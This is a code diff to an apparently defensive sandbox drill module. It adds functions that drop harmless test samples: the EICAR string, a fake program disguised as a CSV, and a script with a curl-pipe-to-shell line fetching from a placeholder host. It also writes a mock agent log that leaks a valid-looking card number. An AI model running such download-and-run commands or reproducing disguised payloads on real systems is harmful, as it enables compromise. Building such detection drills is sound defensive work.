@@ -54,6 +54,7 @@ export async function simulateRansomware(dir = join(SANDBOX, "watched"), paceMs 
 
 export function resetSandbox() {
   rmSync(inside(join(SANDBOX, "watched", "finance-exports")), { recursive: true, force: true });
+  for (const f of existsSync(join(SANDBOX, "runs")) ? readdirSync(join(SANDBOX, "runs")) : []) if (/leak-drill/.test(f)) rmSync(inside(join(SANDBOX, "runs", f)), { force: true });
   seedWatched();
 }
 
@@ -156,4 +157,29 @@ export function simulateUnloggedTransfer(runsDir = join(SANDBOX, "runs")) {
     ev(`evt_mm_${n}`, "payout.transfer.sent", { id: `tr_refund_${n}`, request_id: `ref-${n}`, transfer_amount: 1200, transfer_currency: "USD", beneficiary_id: "ben_customer_on_file", status: "SENT" }),
     ev(`evt_un_${n}`, "payout.transfer.processing", { id: `tr_unknown_${n}`, request_id: "manual-7731", transfer_amount: 9800, transfer_currency: "USD", beneficiary_id: "ben_9f31c2", status: "PROCESSING" }),
   ];
+}
+
+/** Malware drill: drops three harmless samples into the watched folder (EICAR test file, a program disguised as a CSV, a download-and-run script). */
+export async function simulateMalware(dir = join(SANDBOX, "watched", "finance-exports"), paceMs = 900) {
+  const d = inside(dir); mkdirSync(d, { recursive: true });
+  const eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
+  const drops: [string, string | Buffer][] = [
+    ["invoice-0042.csv", eicar],
+    ["statement-2026-10.pdf.csv", Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]), Buffer.from("drill: not a real program")])],
+    ["update-rates.sh", "#!/bin/sh\n# drill sample: never run\ncurl -s https://rates-update.example/x.sh | sh\n"],
+  ];
+  for (const [n, body] of drops) { writeFileSync(inside(join(d, `drill-${n}`)), body); await new Promise((r) => setTimeout(r, paceMs)); }
+}
+
+/** Data-leak drill: an agent run log that writes a customer's full card number (a valid-looking, non-test number made for the drill). */
+export function simulateLeak(runsDir = join(SANDBOX, "runs")) {
+  const dir = inside(runsDir); mkdirSync(dir, { recursive: true });
+  const file = join(dir, `kit14-leak-drill-${Date.now()}.jsonl`);
+  const at = new Date().toISOString();
+  const events = [
+    { at, kind: "step", note: "Reading the customer's failed-payment email" },
+    { at, kind: "llm_extract", task: "failed payment", input: "Hi, my card 4532 0151 1283 0366 was declined twice yesterday. Can you retry?", note: "drill: the card number was not removed before logging" },
+  ];
+  writeFileSync(inside(file), events.map((e) => JSON.stringify(e)).join("\n") + "\n");
+  return file;
 }
